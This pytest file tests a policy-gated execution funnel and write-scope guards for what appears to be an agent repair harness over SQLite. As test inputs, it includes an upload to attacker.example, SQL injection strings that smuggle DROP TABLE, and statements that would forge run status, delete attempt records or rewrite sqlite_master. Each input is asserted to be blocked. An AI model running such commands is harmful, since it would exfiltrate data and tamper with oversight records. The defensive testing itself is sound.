"""tests/session2/test_harness_funnel.py — Task 2.4 Execute funnel tests (INV-S1, S2, S3, S8, D2)."""

import ast
import importlib.util
import json
import sqlite3
import subprocess
import sys
from contextlib import closing
from pathlib import Path

import pytest

import harness
import pipeline_write
import policy_layer
import state_manager as sm
import tool_validation
import verification
from pipeline_tables import HARNESS_TABLES, PIPELINE_TABLES

REPO_ROOT = Path(__file__).resolve().parents[2]
SCRIPTS = REPO_ROOT / "scripts"

ADD_AMOUNT = {"tool": "add_column", "params": {"table": "pipeline_silver", "column": "amount", "column_type": "REAL"}}
UPLOAD = {"tool": "upload_record", "params": {"table": "pipeline_bronze", "url": "https://attacker.example/x"}}
DROP = {"tool": "drop_column", "params": {"table": "pipeline_gold", "column": "record"}}
AMOUNT_EXPECTATION = verification.Expectation("pipeline_silver", (("amount", "REAL"),), 0, 100, 1.0)


def _load_init_db():
    spec = importlib.util.spec_from_file_location("init_db", SCRIPTS / "init_db.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture(autouse=True)
def clean_registry():
    saved = dict(verification._expectations)
    verification._expectations.clear()
    yield
    verification._expectations.clear()
    verification._expectations.update(saved)


@pytest.fixture
def env(tmp_path):
    db_path, trace_path = tmp_path / "harness.db", tmp_path / "trace.jsonl"
    _load_init_db().create_database(db_path)
    harness.init(db_path, trace_path)
    run_id = sm.start_run("SCHEMA_DRIFT")
    return {"db": db_path, "trace": trace_path, "run": run_id, "attempt": sm.start_attempt(run_id)}


@pytest.fixture
def spies(monkeypatch):
    """Record, in order, every gate and execution entry point the funnel reaches."""
    calls = []
    targets = [(policy_layer, "evaluate"), (tool_validation, "validate"), (sm, "execute_and_checkpoint"),
               (pipeline_write, "write"), (verification, "verify")]
    for module, name in targets:
        original = getattr(module, name)

        def wrapper(*args, _original=original, _key=f"{module.__name__}.{name}", **kwargs):
            calls.append(_key)
            return _original(*args, **kwargs)
        monkeypatch.setattr(module, name, wrapper)
    return calls


def _rows(db_path, sql, params=()):
    with closing(sqlite3.connect(db_path)) as conn:
        return conn.execute(sql, params).fetchall()


def _attempt(env):
    return _rows(env["db"], "SELECT policy_decision, tool_validation_result, execution_result, verification_result, "
                            "failure_reason FROM Attempt WHERE id = ?", (env["attempt"],))[0]


def _events(env):
    if not env["trace"].exists():
        return []
    return [json.loads(line) for line in env["trace"].read_text(encoding="utf-8").splitlines()]


def _pipeline(db_path):
    return {t: (_rows(db_path, "SELECT sql FROM sqlite_master WHERE name = ?", (t,)),
                _rows(db_path, f'SELECT * FROM "{t}" ORDER BY id')) for t in PIPELINE_TABLES}


def _stages(monkeypatch):
    """Record every checkpoint stage the State Manager commits, in order."""
    stages = []
    original = sm._write_checkpoint

    def recording(conn, scenario_run_id, stage, state):
        stages.append(stage)
        return original(conn, scenario_run_id, stage, state)
    monkeypatch.setattr(sm, "_write_checkpoint", recording)
    return stages


# --- TC-1: DENY never reaches the pipeline-write primitive (INV-S2) ----------

@pytest.mark.parametrize("action", [UPLOAD,
                                    {"tool": "add_column", "params": {"table": "ScenarioRun", "column": "x", "column_type": "TEXT"}},
                                    {"tool": "http_request", "params": {"url": "https://x"}}, None, {"tool": "nope", "params": {}}])
def test_deny_never_reaches_the_primitive(env, spies, action):
    before = _pipeline(env["db"])
    outcome = harness.attempt_action(env["run"], env["attempt"], action)

    assert spies == ["policy_layer.evaluate"]  # nothing after policy ran
    assert outcome == harness.AttemptOutcome("DENY")
    assert _attempt(env) == ("DENY", None, None, None, None)
    assert sm.resume(env["run"])["attempts_used"] == 0  # INV-D2
    assert _pipeline(env["db"]) == before
    events = _events(env)
    assert [(e["event_type"], e["payload"]["decision"]) for e in events] == [("policy_decision", "DENY")]


def test_require_approval_blocks_execution_pending_approval(env, spies):
    before = _pipeline(env["db"])
    outcome = harness.attempt_action(env["run"], env["attempt"], DROP)

    assert spies == ["policy_layer.evaluate"]
    assert outcome == harness.AttemptOutcome("REQUIRE_APPROVAL")
    assert _attempt(env) == ("REQUIRE_APPROVAL", None, None, None, None)  # execution_result NULL = pending
    assert sm.resume(env["run"])["attempts_used"] == 0  # INV-D2 applies to REQUIRE_APPROVAL too
    assert _pipeline(env["db"]) == before
    (event,) = _events(env)
    assert event["payload"]["decision"] == "REQUIRE_APPROVAL"
    assert event["payload"]["approval"] == policy_layer.PENDING


# --- TC-2: ALLOW + valid executes and checkpoints twice ----------------------

def test_allow_valid_executes_and_checkpoints_around_execute(env, spies, monkeypatch):
    verification.register_expectation("SCHEMA_DRIFT", AMOUNT_EXPECTATION)
    stages = _stages(monkeypatch)
    outcome = harness.attempt_action(env["run"], env["attempt"], ADD_AMOUNT)

    # Fixed order (INV-S1). The primitive re-validates the call itself (defence in depth), hence the second validate.
    assert spies == ["policy_layer.evaluate", "tool_validation.validate", "state_manager.execute_and_checkpoint",
                     "pipeline_write.write", "tool_validation.validate", "verification.verify"]
    assert stages == ["policy", "tool_validation", "pre_execute", "post_execute", "verification"]  # INV-S3
    assert stages.count("pre_execute") == stages.count("post_execute") == 1
    assert outcome.executed and outcome.verification_result == "PASS" and outcome.failure_reason is None
    assert _attempt(env) == ("ALLOW", "VALID", "add_column: added pipeline_silver.amount REAL", "PASS", None)
    state = sm.resume(env["run"])
    assert state["attempts_used"] == 1 and state["action_applied"] is True and state["status"] == "IN_PROGRESS"
    assert ("amount", "REAL") in [(r[1], r[2]) for r in _rows(env["db"], "PRAGMA table_info(pipeline_silver)")]


def test_pre_execute_is_committed_before_the_primitive_runs(env, monkeypatch):
    seen = {}
    original = pipeline_write.write

    def observing(conn, tool, params):
        seen["stage"] = sm.resume(env["run"])["last_stage"]  # separate connection: committed state only
        return original(conn, tool, params)
    monkeypatch.setattr(pipeline_write, "write", observing)
    harness.attempt_action(env["run"], env["attempt"], ADD_AMOUNT)
    assert seen["stage"] == "pre_execute"


def test_trace_follows_every_stage_after_its_commit(env):
    verification.register_expectation("SCHEMA_DRIFT", AMOUNT_EXPECTATION)
    harness.attempt_action(env["run"], env["attempt"], ADD_AMOUNT)
    events = _events(env)
    assert [e["event_type"] for e in events] == ["policy_decision", "state_transition", "tool_call", "state_transition"]
    assert events[0]["payload"]["attempts_used"] == 1
    assert events[1]["payload"] == {"stage": "tool_validation", "result": "VALID", "reason": None}
    assert events[2]["payload"]["execution_result"] == "add_column: added pipeline_silver.amount REAL"
    assert events[3]["payload"] == {"stage": "verification", "result": "PASS", "details": []}
    assert all(e["attempt_id"] == env["attempt"] for e in events)


def test_verification_failure_is_recorded_not_recovered(env):
    verification.register_expectation("SCHEMA_DRIFT", verification.Expectation("pipeline_silver", (("total", None),), 0, 9, 0.0))
    outcome = harness.attempt_action(env["run"], env["attempt"], ADD_AMOUNT)
    assert outcome.executed and outcome.verification_result == "FAIL"
    assert outcome.failure_reason == "schema: pipeline_silver.total is missing"
    assert _attempt(env)[3:] == ("FAIL", "schema: pipeline_silver.total is missing")
    with pytest.raises(sm.CheckpointError, match="INV-S5"):
        sm.checkpoint(env["run"], "run_complete", {"attempt_id": env["attempt"], "status": "RECOVERED"})


def test_verified_attempt_can_complete_the_run(env):
    verification.register_expectation("SCHEMA_DRIFT", AMOUNT_EXPECTATION)
    harness.attempt_action(env["run"], env["attempt"], ADD_AMOUNT)
    sm.checkpoint(env["run"], "run_complete", {"attempt_id": env["attempt"], "status": "RECOVERED"})
    assert sm.resume(env["run"])["status"] == "RECOVERED"


# --- ALLOW + REJECTED: no execution, budget consumed, re-plan requested ------

def test_rejected_tool_call_never_executes(env, spies):
    action = {"tool": "add_column", "params": {"table": "pipeline_silver", "column": "amount"}}  # missing column_type
    before = _pipeline(env["db"])
    outcome = harness.attempt_action(env["run"], env["attempt"], action)

    assert spies == ["policy_layer.evaluate", "tool_validation.validate"]
    assert outcome.needs_replan and not outcome.executed and outcome.tool_validation_result == "REJECTED"
    assert "missing parameters ['column_type']" in outcome.failure_reason
    decision, validation, execution, verified, reason = _attempt(env)
    assert (decision, validation, execution, verified) == ("ALLOW", "REJECTED", None, None)
    assert reason == outcome.failure_reason  # INV-D3
    assert sm.resume(env["run"])["attempts_used"] == 1  # an ALLOW-decided attempt consumes budget (INV-D2)
    assert _pipeline(env["db"]) == before


# --- Real pipeline mutations through the primitive ---------------------------

def test_rename_and_backfill_through_the_funnel(env):
    with closing(sqlite3.connect(env["db"])) as conn:
        conn.execute('ALTER TABLE pipeline_bronze ADD COLUMN "amt" REAL')
        conn.executemany("INSERT INTO pipeline_bronze (record, amt) VALUES (?, ?)", [("a", 1.0), ("b", None), ("c", None)])
        conn.commit()
    rename = {"tool": "rename_column", "params": {"table": "pipeline_bronze", "old_name": "amt", "new_name": "amount"}}
    assert harness.attempt_action(env["run"], env["attempt"], rename).executed
    second = sm.start_attempt(env["run"])
    injected = "0); DROP TABLE ScenarioRun; --"
    backfill = {"tool": "backfill_column", "params": {"table": "pipeline_bronze", "column": "amount", "value": injected}}
    outcome = harness.attempt_action(env["run"], second, backfill)
    assert outcome.execution_result == "backfill_column: set 2 NULL value(s) in pipeline_bronze.amount"
    assert _rows(env["db"], "SELECT amount FROM pipeline_bronze ORDER BY id") == [(1.0,), (injected,), (injected,)]
    assert _rows(env["db"], "SELECT COUNT(*) FROM ScenarioRun") == [(1,)]  # injected text stayed data
    assert sm.resume(env["run"])["attempts_used"] == 2


def test_execution_error_rolls_back_and_propagates(env):
    bad_rename = {"tool": "rename_column", "params": {"table": "pipeline_bronze", "old_name": "missing", "new_name": "x"}}
    with pytest.raises(sqlite3.OperationalError):
        harness.attempt_action(env["run"], env["attempt"], bad_rename)
    state = sm.resume(env["run"])
    assert state["last_stage"] == "pre_execute" and state["action_applied"] is False
    assert _attempt(env)[:3] == ("ALLOW", "VALID", None)


def test_an_attempt_goes_through_the_funnel_only_once(env):
    verification.register_expectation("SCHEMA_DRIFT", AMOUNT_EXPECTATION)
    harness.attempt_action(env["run"], env["attempt"], ADD_AMOUNT)
    before = (_pipeline(env["db"]), _attempt(env), sm.resume(env["run"])["attempts_used"])
    for action in (ADD_AMOUNT, UPLOAD, DROP):
        with pytest.raises(sm.CheckpointError, match="already has a recorded policy_decision"):
            harness.attempt_action(env["run"], env["attempt"], action)
    assert (_pipeline(env["db"]), _attempt(env), sm.resume(env["run"])["attempts_used"]) == before


def test_failed_checkpoint_emits_no_trace(env):
    sm.checkpoint(env["run"], "run_complete", {"status": "UNRECOVERED"})
    with pytest.raises(sm.CheckpointError, match="INV-D5"):
        harness.attempt_action(env["run"], env["attempt"], UPLOAD)
    assert _events(env) == []  # the trace never claims what did not commit


def test_unserialisable_action_is_still_denied_and_traced(env):
    action = {"tool": "upload_record", "params": {"table": "pipeline_bronze", "blob": object(), "x": float("nan")}}
    assert harness.attempt_action(env["run"], env["attempt"], action).policy_decision == "DENY"
    (event,) = _events(env)
    assert isinstance(event["payload"]["action"], str)


# --- INV-S1: execution needs both gates on record (State Manager guard) ------

@pytest.mark.parametrize("gates", [(None, None), ("DENY", None), ("REQUIRE_APPROVAL", None), ("ALLOW", None), ("ALLOW", "REJECTED")])
def test_execute_refused_unless_allow_and_valid(env, gates):
    decision, validation = gates
    if decision:
        increment = {"attempts_used": 1} if decision == "ALLOW" else {}
        sm.checkpoint(env["run"], "policy", {"attempt_id": env["attempt"], "policy_decision": decision, **increment})
    if validation:
        sm.checkpoint(env["run"], "tool_validation", {"attempt_id": env["attempt"], "tool_validation_result": validation,
                                                      "failure_reason": "x"})
    before = _pipeline(env["db"])
    with pytest.raises(sm.CheckpointError, match="INV-S1: attempt .* is not cleared for execution"):
        sm.execute_and_checkpoint(env["run"], env["attempt"],
                                  lambda conn: pipeline_write.write(conn, "add_column", ADD_AMOUNT["params"]))
    assert _pipeline(env["db"]) == before
    assert sm.resume(env["run"])["last_stage"] != "pre_execute"


# --- TC-4 / INV-S8: the primitive rejects targets outside PipelineState at runtime -

@pytest.mark.parametrize("target", list(HARNESS_TABLES) + ["sqlite_master", "sqlite_sequence", "main.ScenarioRun",
                                                          "scenariorun", "Attempt ", "", None, 1])
@pytest.mark.parametrize("tool,params", [
    ("backfill_column", {"column": "status", "value": "RECOVERED"}),
    ("add_column", {"column": "evil", "column_type": "TEXT"}),
    ("rename_column", {"old_name": "status", "new_name": "s"}),
])
def test_primitive_rejects_non_pipeline_target(env, target, tool, params):
    before = _rows(env["db"], "SELECT name, sql FROM sqlite_master ORDER BY name")
    with closing(sqlite3.connect(env["db"], isolation_level=None)) as conn:
        conn.execute("BEGIN")
        with pytest.raises(pipeline_write.WriteScopeError, match="INV-S8"):
            pipeline_write.write(conn, tool, dict(params, table=target))
        conn.execute("ROLLBACK")
    assert _rows(env["db"], "SELECT name, sql FROM sqlite_master ORDER BY name") == before


@pytest.mark.parametrize("tool,params", [
    ("add_column", {"table": "pipeline_bronze", "column": 'x" TEXT); DROP TABLE ScenarioRun; --', "column_type": "TEXT"}),
    ("add_column", {"table": "pipeline_bronze", "column": "x", "column_type": "TEXT; DROP TABLE Attempt"}),
    ("execute_sql", {"table": "pipeline_bronze", "sql": "DELETE FROM Attempt"}),
    ("backfill_column", {"table": "pipeline_bronze", "column": "rowid", "value": 1}),
    ("backfill_column", {"table": "pipeline_bronze", "column": "record"}),
])
def test_primitive_refuses_unvalidated_calls_even_on_pipeline_tables(env, tool, params):
    before = _pipeline(env["db"])
    with closing(sqlite3.connect(env["db"], isolation_level=None)) as conn:
        conn.execute("BEGIN")
        with pytest.raises(pipeline_write.InvalidToolCall):
            pipeline_write.write(conn, tool, params)
        conn.execute("ROLLBACK")
    assert _pipeline(env["db"]) == before


@pytest.mark.parametrize("params", [None, "table=pipeline_bronze", ["pipeline_bronze"]])
def test_primitive_rejects_malformed_params(env, params):
    with closing(sqlite3.connect(env["db"])) as conn:
        with pytest.raises(pipeline_write.WriteScopeError):
            pipeline_write.write(conn, "add_column", params)


# --- INV-S8 runtime guard #2: the apply_fn authorizer --------------------------

def _cleared_attempt(env):
    sm.checkpoint(env["run"], "policy", {"attempt_id": env["attempt"], "policy_decision": "ALLOW", "attempts_used": 1})
    sm.checkpoint(env["run"], "tool_validation", {"attempt_id": env["attempt"], "tool_validation_result": "VALID"})


def _harness_state(db_path):
    return (_rows(db_path, "SELECT id, status, attempts_used FROM ScenarioRun"),
            _rows(db_path, "SELECT id, policy_decision, tool_validation_result, execution_result, verification_result FROM Attempt"),
            _rows(db_path, "SELECT COUNT(*) FROM TraceEvent"),
            _rows(db_path, "SELECT name, sql FROM sqlite_master ORDER BY name"))


@pytest.mark.parametrize("sql", [
    "UPDATE ScenarioRun SET status = 'RECOVERED'",
    "UPDATE ScenarioRun SET attempts_used = 0",
    "UPDATE Attempt SET verification_result = 'PASS'",
    "DELETE FROM Attempt",
    "INSERT INTO TraceEvent (scenario_run_id, event_type) VALUES (1, 'tool_call')",
    "UPDATE main.Attempt SET plan = 'x'",
    "DROP TABLE pipeline_gold",
    "CREATE TABLE side_channel (x)",
    "CREATE INDEX i ON pipeline_bronze (record)",
    "CREATE TRIGGER t AFTER INSERT ON pipeline_bronze BEGIN DELETE FROM Attempt; END",
    "CREATE VIEW v AS SELECT 1",
    "ALTER TABLE ScenarioRun ADD COLUMN x TEXT",
    "ALTER TABLE pipeline_bronze RENAME TO pipeline_platinum",
    "PRAGMA writable_schema = ON",
    "PRAGMA foreign_keys = OFF",
    "ATTACH DATABASE ':memory:' AS other",
    "ANALYZE",
    "REINDEX",
])
def test_apply_fn_writes_outside_pipeline_denied(env, sql):
    _cleared_attempt(env)
    before = _harness_state(env["db"])
    with pytest.raises(sqlite3.DatabaseError, match="not authorized"):
        sm.execute_and_checkpoint(env["run"], env["attempt"], lambda conn: conn.execute(sql) and "ran")
    assert _harness_state(env["db"]) == before
    assert sm.resume(env["run"])["action_applied"] is False


def test_trigger_writing_harness_table_denied(env):
    with closing(sqlite3.connect(env["db"])) as conn:
        conn.execute("CREATE TRIGGER evil AFTER INSERT ON pipeline_silver BEGIN UPDATE ScenarioRun SET status = 'RECOVERED'; END")
        conn.commit()
    _cleared_attempt(env)
    with pytest.raises(sqlite3.DatabaseError, match="not authorized"):
        sm.execute_and_checkpoint(env["run"], env["attempt"],
                                  lambda conn: conn.execute("INSERT INTO pipeline_silver (record) VALUES ('x')") and "ran")
    assert _rows(env["db"], "SELECT status FROM ScenarioRun") == [("IN_PROGRESS",)]
    assert _rows(env["db"], "SELECT COUNT(*) FROM pipeline_silver") == [(0,)]


@pytest.mark.parametrize("sql", [
    "INSERT INTO pipeline_gold (record) VALUES ('ok')",
    "UPDATE pipeline_bronze SET record = 'ok'",
    "DELETE FROM pipeline_silver",
    'ALTER TABLE "pipeline_gold" ADD COLUMN "c" TEXT',
    "SELECT COUNT(*) FROM ScenarioRun",  # reads are not restricted
    "WITH RECURSIVE n(x) AS (SELECT 1 UNION ALL SELECT x + 1 FROM n WHERE x < 3) SELECT * FROM n",
])
def test_apply_fn_pipeline_writes_and_reads_allowed(env, sql):
    _cleared_attempt(env)
    sm.execute_and_checkpoint(env["run"], env["attempt"], lambda conn: conn.execute(sql) and "ok")
    assert sm.resume(env["run"])["action_applied"] is True


# --- Structural (TC-3) and consistency checks ---------------------------------

def _run_script(name, *args):
    return subprocess.run([sys.executable, str(SCRIPTS / name), *args], capture_output=True, text=True,
                          timeout=120, cwd=REPO_ROOT)


@pytest.mark.parametrize("script,args", [
    ("assert_single_execute_caller.py", ()),
    ("assert_write_scope_isolation.py", ()),
    ("simulate_deny_path.py", ("--assert-no-execution",)),
])
def test_standing_harness_check_passes(script, args):
    result = _run_script(script, *args)
    assert result.returncode == 0, result.stdout + result.stderr


def _single_caller_checker():
    spec = importlib.util.spec_from_file_location("single_caller", SCRIPTS / "assert_single_execute_caller.py")
    checker = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(checker)
    return checker


# Challenge Findings 1 and 3: every way of reaching the primitive or execute_and_checkpoint is a reference.
@pytest.mark.parametrize("source,guarded", [
    ("import pipeline_write\npipeline_write.write(c, 't', {})", "pipeline_write"),
    ("import pipeline_write as pw\npw.write(c, 't', {})", "pipeline_write"),
    ("from pipeline_write import write\nwrite(c, 't', {})", "pipeline_write"),
    ("from pipeline_write import write as w\nw(c, 't', {})", "pipeline_write"),
    ("import harness\nharness.pipeline_write.write(c, 't', {})", "pipeline_write"),  # attribute chain
    ("import importlib\nm = importlib.import_module('pipeline_write')\nm.write(c, 't', {})", "pipeline_write"),
    ("m = __import__('pipeline_write')", "pipeline_write"),
    ("import harness\nf = getattr(harness, 'pipeline_write')", "pipeline_write"),
    ("import state_manager\nstate_manager.execute_and_checkpoint(1, 2, f)", "execute_and_checkpoint"),
    ("from state_manager import execute_and_checkpoint as run\nrun(1, 2, f)", "execute_and_checkpoint"),
    ("import state_manager as sm\nrun = sm.execute_and_checkpoint\nrun(1, 2, f)", "execute_and_checkpoint"),
    ("import state_manager\nrun = getattr(state_manager, 'execute_and_checkpoint')", "execute_and_checkpoint"),
])
def test_reference_detector_catches_every_access_form(source, guarded):
    assert guarded in _single_caller_checker().referenced_names(ast.parse(source))


@pytest.mark.parametrize("source", [
    "x = 'pipeline_write is the primitive'",  # prose in a string is not a reference
    "import trace_logger\ntrace_logger.emit(1, 2, 'tool_call', {})",
    "def write(): pass\nwrite()",
])
def test_reference_detector_ignores_unrelated_code(source):
    names = _single_caller_checker().referenced_names(ast.parse(source))
    assert not {"pipeline_write", "execute_and_checkpoint"} & names


def test_call_site_counter_counts_owner_qualified_calls():
    checker = _single_caller_checker()
    tree = ast.parse("pipeline_write.write(a)\nother.write(b)\nwrite(c)\nx.execute_and_checkpoint(d)\nexecute_and_checkpoint(e)")
    assert checker.call_sites(tree, "write", owner="pipeline_write") == [1]
    assert checker.call_sites(tree, "execute_and_checkpoint") == [4, 5]


# Challenge Finding 2: tools/ and verification/ are scanned too.
def test_single_caller_check_scans_every_permitted_code_directory():
    checker = _single_caller_checker()
    assert set(checker.SCANNED_DIRECTORIES) == {"src", "scripts", "tools", "verification"}
    assert checker.CHECK_SCRIPTS == ("scripts/assert_write_scope_isolation.py", "scripts/simulate_deny_path.py")


@pytest.mark.parametrize("directory", ["tools", "verification", "scripts"])
def test_single_caller_check_fails_on_a_planted_second_caller(directory):
    planted = REPO_ROOT / directory / "zz_planted_second_caller.py"
    planted.write_text("import harness\nharness.pipeline_write.write(None, 'add_column', {})\n", encoding="utf-8")
    try:
        result = _run_script("assert_single_execute_caller.py")
    finally:
        planted.unlink()
    assert result.returncode == 1
    assert f"{directory}/zz_planted_second_caller.py references pipeline_write" in result.stdout


def test_every_allowlisted_tool_has_exactly_one_implementation():
    assert set(pipeline_write.IMPLEMENTATIONS) == set(tool_validation.TOOL_SCHEMAS)
    assert set(tool_validation.TOOL_SCHEMAS) == set(policy_layer.LOCAL_REPAIR_TOOLS)


def test_harness_is_the_verification_stage_caller():
    source = (REPO_ROOT / "src" / "harness.py").read_text(encoding="utf-8")
    assert 'state_manager.checkpoint(scenario_run_id, "verification", state)' in source


def test_check_script_exemption_is_exactly_the_two_check_scripts():
    checker = _single_caller_checker()
    scanned = {p.relative_to(REPO_ROOT).as_posix() for p in checker.scanned_files()}
    assert "src/harness.py" in scanned and "scripts/assert_single_execute_caller.py" in scanned
    assert not set(checker.CHECK_SCRIPTS) & scanned
    assert not any(name.startswith("tests/") for name in scanned)


# --- Challenge Finding 4: the authorizer's one non-pipeline write allowance --------

@pytest.mark.parametrize("sql", [
    "UPDATE sqlite_master SET sql = 'CREATE TABLE ScenarioRun (x)' WHERE name = 'ScenarioRun'",
    "UPDATE main.sqlite_master SET name = 'renamed' WHERE name = 'Attempt'",
    "UPDATE sqlite_temp_master SET sql = 'x'",
    "DELETE FROM sqlite_master WHERE name = 'TraceEvent'",
    "INSERT INTO sqlite_master (type, name, tbl_name, rootpage, sql) VALUES ('table', 'x', 'x', 0, 'CREATE TABLE x(y)')",
])
def test_direct_schema_table_writes_from_apply_fn_rejected(env, sql):
    _cleared_attempt(env)
    before = _harness_state(env["db"])
    with pytest.raises(sqlite3.DatabaseError, match="not authorized|may not be modified"):
        sm.execute_and_checkpoint(env["run"], env["attempt"], lambda conn: conn.execute(sql) and "ran")
    assert _harness_state(env["db"]) == before  # includes every sqlite_master row
    assert sm.resume(env["run"])["action_applied"] is False


def test_rename_table_out_of_pipeline_scope_denied_by_authorizer(env):
    _cleared_attempt(env)
    with pytest.raises(sqlite3.DatabaseError, match="not authorized"):
        sm.execute_and_checkpoint(env["run"], env["attempt"],
                                  lambda conn: conn.execute("ALTER TABLE pipeline_bronze RENAME TO pipeline_platinum") and "ran")
    assert _rows(env["db"], "SELECT name FROM sqlite_master WHERE name = 'pipeline_bronze'") == [("pipeline_bronze",)]
